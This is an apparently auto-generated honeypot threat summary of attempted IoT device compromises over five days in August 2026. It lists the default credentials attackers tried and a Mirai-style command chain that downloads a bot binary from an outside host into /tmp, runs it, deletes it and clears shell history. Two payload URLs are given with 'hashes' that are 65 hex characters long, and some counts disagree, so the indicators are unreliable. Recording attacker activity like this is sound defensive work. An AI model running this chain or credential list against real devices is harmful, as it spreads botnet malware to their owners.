# Threat summary

_Auto-generated 2026-09-04 from 2026-08-12 to 2026-08-16._

- **60** sessions from **9** distinct IPs
- **209** login attempts, **19** landed on an accepted credential
- **98** shell commands, **9** payload downloads

## Most-tried credentials

| username / password | attempts |
|---|---|
| `admin / password` | 13 |
| `pi / raspberry` | 12 |
| `ubnt / ubnt` | 12 |
| `admin / smcadmin` | 12 |
| `admin / 1234` | 11 |
| `root / admin` | 10 |
| `root / ` | 10 |
| `user / user` | 10 |
| `root / 54321` | 10 |
| `root / 1111` | 9 |

## Most-run commands

- `/bin/busybox MIRAI` (14)
- `cat /proc/mounts` (14)
- `cat /proc/cpuinfo | grep name | head -n 1` (14)
- `uname -a` (14)
- `free -m` (11)
- `wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x` (9)
- `chmod +x /tmp/.x` (8)
- `/tmp/.x` (7)
- `rm -rf /tmp/.x` (5)
- `history -c` (2)

## Payloads pulled

- `http://203.0.113.201/a/kaiten.arm7` — `9f2e5c8b1a4d7e0c3f6b9a2d5e8c1b4f7a0d3c6e9b2f5a8d1c4e7b0f3a6d9c2e5` (6)
- `http://198.51.100.250/bins/mirai.x86` — `3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9` (3)
